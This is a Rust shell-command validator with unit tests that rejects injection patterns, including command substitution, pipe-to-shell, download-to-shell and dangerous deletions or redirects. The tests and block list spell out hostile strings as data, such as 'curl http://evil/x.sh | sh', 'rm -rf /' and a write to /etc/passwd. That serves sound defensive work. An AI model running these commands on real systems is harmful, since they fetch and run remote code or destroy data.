use std::fmt;

#[derive(Debug)]
pub struct ShellValidationError {
    pub reason: String,
}

impl fmt::Display for ShellValidationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "shell validation failed: {}", self.reason)
    }
}

impl std::error::Error for ShellValidationError {}

/// Validate a shell command for dangerous patterns.
///
/// Returns `Ok(())` for benign commands, `Err` when an injection primitive is
/// detected. **Callers must treat `Err` as fatal** (refuse to run the command);
/// logging-only use provides no protection.
///
/// The check targets clear injection primitives (command substitution, expansion,
/// embedded newlines, pipe-to-shell, download-to-shell) and catastrophic
/// deletions. It deliberately does *not* ban `;`, `&&`, or `|` in general,
/// because legitimate build hooks use them (e.g. `cargo fmt && cargo test`); the
/// primary control for config-driven commands is the authenticated WebUI config
/// gate, not this validator.
pub fn validate_shell_command(cmd: &str) -> Result<(), ShellValidationError> {
    let reject = |reason: &str| -> Result<(), ShellValidationError> {
        Err(ShellValidationError {
            reason: reason.to_string(),
        })
    };

    let literal_checks: &[(&str, &str)] = &[
        ("$(", "command substitution ($(...))"),
        ("`", "command substitution (backtick)"),
        ("${", "parameter expansion (${...})"),
        ("\n", "embedded newline"),
        ("\r", "embedded carriage return"),
        ("rm -rf /", "dangerous deletion (rm -rf /)"),
        ("rm -rf /*", "dangerous deletion (rm -rf /*)"),
    ];
    for (pat, why) in literal_checks {
        if cmd.contains(pat) {
            return reject(why);
        }
    }

    let lowered = cmd.to_ascii_lowercase();
    // Pipe into an interactive shell interpreter.
    for sh in ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"] {
        if lowered.contains(sh) {
            return reject("pipe into a shell interpreter");
        }
    }
    // Download piped to any command (e.g. `curl ... | sh`, `wget -O- ... | bash`).
    if (lowered.contains("curl ") || lowered.contains("wget ")) && lowered.contains('|') {
        return reject("download piped to a command");
    }

    // Redirections into sensitive locations.
    let dangerous_redirects = [
        "> /etc", "> /usr", "> /bin", "> /sbin", "> /lib", "< /etc", "< /usr", "< /bin", "< /sbin",
        "< /lib", ">> /etc", ">> /usr", ">> /bin", ">> /sbin", ">> /lib", "> $HOME", ">> $HOME",
        "> ~/", ">> ~/",
    ];
    for pat in &dangerous_redirects {
        if cmd.contains(pat) {
            return reject(&format!("dangerous redirection pattern: {pat}"));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn benign_commands_pass() {
        assert!(validate_shell_command("cargo test").is_ok());
        assert!(validate_shell_command("cargo fmt && cargo test").is_ok());
        assert!(validate_shell_command("npm test -- --coverage").is_ok());
    }

    #[test]
    fn injection_primitives_rejected() {
        assert!(validate_shell_command("cargo test $(touch /tmp/pwned)").is_err());
        assert!(validate_shell_command("echo `id`").is_err());
        assert!(validate_shell_command("echo ${HOME}").is_err());
        assert!(validate_shell_command("cargo test\ncurl evil | sh").is_err());
    }

    #[test]
    fn download_to_shell_rejected() {
        assert!(validate_shell_command("curl http://evil/x.sh | sh").is_err());
        assert!(validate_shell_command("wget -O- http://evil/x | bash").is_err());
    }

    #[test]
    fn dangerous_redirects_rejected() {
        assert!(validate_shell_command("echo x > /etc/passwd").is_err());
        assert!(validate_shell_command("rm -rf /").is_err());
    }
}
